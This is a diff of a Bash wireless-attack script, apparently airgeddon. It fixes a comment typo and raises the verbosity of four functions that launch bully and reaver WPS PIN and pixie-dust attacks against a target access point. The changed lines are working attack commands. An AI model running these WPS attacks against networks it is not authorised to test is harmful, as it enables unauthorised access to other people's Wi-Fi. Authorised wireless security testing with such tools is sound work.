@@ -3499,7 +3499,7 @@ function language_strings() {
 	esac
 }
 
-#Set the message to show again after an interrupt ([Ctrl+C] or [Crtl+Z]) without exiting
+#Set the message to show again after an interrupt ([Ctrl+C] or [Ctrl+Z]) without exiting
 function interrupt_checkpoint() {
 
 	if [ -z "${last_buffered_type1}" ]; then
@@ -4287,7 +4287,7 @@ function exec_wps_custom_pin_bully_attack() {
 	language_strings "${language}" 366 "blue"
 	language_strings "${language}" 4 "read"
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg red -geometry "${g2_stdleft_window}" -T "WPS custom pin bully attack" -e "bully ${interface} -b ${wps_bssid} -c ${wps_channel} -L --force -B -p ${custom_pin} -v 2 && echo \"Close this window\"" > /dev/null 2>&1
+	xterm -hold -bg black -fg red -geometry "${g2_stdleft_window}" -T "WPS custom pin bully attack" -e "bully ${interface} -b ${wps_bssid} -c ${wps_channel} -L --force -B -p ${custom_pin} -v 4 && echo \"Close this window\"" > /dev/null 2>&1
 }
 
 #Execute wps custom pin reaver attack
@@ -4301,7 +4301,7 @@ function exec_wps_custom_pin_reaver_attack() {
 	language_strings "${language}" 366 "blue"
 	language_strings "${language}" 4 "read"
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg red -geometry "${g2_stdleft_window}" -T "WPS custom pin reaver attack" -e "reaver -i ${interface} -b ${wps_bssid} -c ${wps_channel} -L -f -n -p ${custom_pin} -vv && echo \"Close this window\"" > /dev/null 2>&1
+	xterm -hold -bg black -fg red -geometry "${g2_stdleft_window}" -T "WPS custom pin reaver attack" -e "reaver -i ${interface} -b ${wps_bssid} -c ${wps_channel} -L -f -n -p ${custom_pin} -vvv && echo \"Close this window\"" > /dev/null 2>&1
 }
 
 #Execute bully pixie dust attack
@@ -4315,7 +4315,7 @@ function exec_bully_pixiewps_attack() {
 	language_strings "${language}" 366 "blue"
 	language_strings "${language}" 4 "read"
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg red -geometry "${g2_stdright_window}" -T "WPS bully pixie dust attack" -e "bully ${interface} -b ${wps_bssid} -c ${wps_channel} -d -v 2 && echo \"Close this window\"" > /dev/null 2>&1
+	xterm -hold -bg black -fg red -geometry "${g2_stdright_window}" -T "WPS bully pixie dust attack" -e "bully ${interface} -b ${wps_bssid} -c ${wps_channel} -d -v 4 && echo \"Close this window\"" > /dev/null 2>&1
 }
 
 #Execute reaver pixie dust attack
@@ -4329,7 +4329,7 @@ function exec_reaver_pixiewps_attack() {
 	language_strings "${language}" 366 "blue"
 	language_strings "${language}" 4 "read"
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg red -geometry "${g2_stdright_window}" -T "WPS reaver pixie dust attack" -e "reaver -i ${interface} -b ${wps_bssid} -c ${wps_channel} -K 1 -vv && echo \"Close this window\"" > /dev/null 2>&1
+	xterm -hold -bg black -fg red -geometry "${g2_stdright_window}" -T "WPS reaver pixie dust attack" -e "reaver -i ${interface} -b ${wps_bssid} -c ${wps_channel} -K 1 -vvv && echo \"Close this window\"" > /dev/null 2>&1
 }
 
 #Execute mdk3 deauth DoS attack
